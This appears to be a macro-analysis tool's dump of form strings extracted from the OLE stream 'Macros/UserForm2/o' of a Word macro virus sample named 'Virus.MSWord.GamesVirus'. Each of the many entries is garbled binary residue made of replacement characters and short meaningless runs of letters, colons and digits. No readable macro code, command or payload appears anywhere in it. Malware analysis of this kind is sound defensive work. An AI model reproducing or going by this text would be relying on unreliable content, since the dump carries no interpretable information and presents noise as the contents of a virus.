- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������:������������������������������������������������������������ö����������񽽩����񑡡������ý��Õ���񨡢����������������ඓ������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I::::<<:<99<9:9999<9:<:<:99FQ��M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�����������������������������������:�������������������::��������������������������������������������������������������������������������������������򽕕���������������������듓�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
STRBB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9:����������������������������������������:��������������:�������������������������������������������������������������ý�����������ý����񙢡���������<�����񘚘�������������듓��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�JF�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<0I99
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:<����������������������������������������:���������������::��������������������������������������������������������������������������������񘙡���������������������������������𶓓��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R<�BJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<��WX
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U9IMJ::::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0�<GGF�H�<���������������������������������������������������������������������������������������������������������������������������������Ñ�Õ���Ù��������������������򑞙������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IAUBJV9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�P<9O<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
XSBXH99��9OM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OK�FC9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:���������������������������������������:��������:����������������������������������������������������������������������ý��ý������ýÙ�������������򽽽�����񞙞���������Ó�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S�TOE\UBE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
XCCMSKND
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������������������������:�������������������������������������������������������������������������������񑶕�����ýý�񙚞������ý�����ý����������������ޮ�����ö�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������븸�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������:���������������������������������������������������������������������ý��ýý���������������Õ�Ó�����Þ��������땕��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������JB0����������������������������������������������������������������������������������ý�Ó��Ñ�������������������������Ö�������򽕕��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:::<::::::::9:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:��ܶ�������������������������������:�����������������������������������������������������������������������������������������ýÑ���������������������������������������򕽓�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
999�999<<99<9999<99999�9<9:9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�����ܽ������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������������������������������������������������������ý����Ñ��������������������������ý��������򕕽������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�99<<9�9�99999999<99999��:9:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������IF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����:�������������������������������������������������������������������������ܕ�ý������Î��򓍍��������������������񑕽�����ý��Õ�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E9�99�9�999<9:<::9<<��9�999
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I:��������������������������������������������������������������������������������ý������������������������������ý����ö��������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�B9<99N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
TQC�<9<9:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JBBF:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������:������������������������������������������������������������������������������ý����������������������ý�����������ý���������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�B9<99Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<I:NK:<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<NI<9<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������������������������������������������������������������������������������������������������������oo���ö�������������񽽽���������������KI�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�99<:T�99�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
00:K99<BMQS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���9�I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9���������������������������������������I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o<Ñ�����������������񽑶ý������������IBNJ�9����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K9<�BUJ9999
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�RI<<9<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��F�������������������������������������������������������������������������������������zo:���ý��å����Ñ�����ö������������9�9��Ѿ����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I<�<T�R999999�9�<9<9S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������������K�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������������������������������������������������������������������o�����������������������Î����:����������<<���F���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I999<SH9<9�<999�<9<9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IU��A�M0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������JJ���������������������������������������������������������������������������������������������ý�ý���������ý:�����:���������:99
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I<9999999<9��9�9<9<:<<99<9<�JF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
KKBM�Ml
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������������������������9������������������������������������������������������������������������������������������������������������ý�������ý�����������:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I99::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
99<<::�9::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:9<::<<<<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��R�M��Q<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������<����������������������������ýÓ��������::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�Ð���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I99FI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<�:9�:<FII��:9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:99�9JI9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E<9������������������������������������N��K�����������������������������������������������������������������������������������������񽕽������������ý��ý��������������:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::��򑐘�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9F9:9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Õ�ý���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������������������������������������������������������������������������򽽓���񽥽������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:����ܥ�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F��:�I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�<F�JE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������������������::������:�������������������������������������������������������������������������:�ý���������ý������������������Õ�Ñ:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�������ܘ�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I99KH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9E99K<9J9�999NRIHHN99�JDR99�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<ý����������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:::::�:���������������������������������������������������������������������������������������ý��������ý��������Ñ�ý���<:::���������������o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I<<<<:<:<<�<<:�9<<9::<:::9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�����������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��9�:�:::�������������������������������������������������������������������������������Ö�������������ý�Ñ��������������ý�å��ý�����������oo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K�Õ��99��99��Õ�99�����9��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ý��������������������������������������:����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<���������������������������������������������������������������������������Ñ�����������������Ó�����������������������Ö����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��B��Fî����N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IJKK�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:<9F<:����ܕ�����������������������������������:���:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������:Ʈ<�:���������������������������������������������������������������ý�����������������������������������������񥓑�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
NXUHS<Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::�CF�SOG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::����������������������������������������ｮ��<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�����ӕ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�������������������������������������������������𶑎����������������������������������ý��Õ�������������������ö����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O��WKMO:9Q:::���OP
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�HJ�<C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:����������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:<9�::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ӻ�::���Įå��������������������������������������������𑐑���������������ý��������񽑩��ý�Õ������ý������������������������������o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��S��NAMH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
FF9OCFFKAMH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:���������������������������������������:::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:������::����������������������������������������������������򑐐�������������Ñ�������������������ý��񽽽��������������o����������ܽ����o�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ʹT���ӌ���R�ͯӯ������Ư�������T�Uӌ�ӻ����SJ�å�������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<ø��:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�ʾ�������������������������������������������������������������������Ño���������������ý�����ý�����������ooz�����������ö�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������������ӱ�����������������<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ñ��������������������������������������:::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
::::<��:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ÿ�ŵ�Ư�������������������������������������������������������������ý��o���������������ý������������ý��������������������������
-------------------------------------------------------------------------------
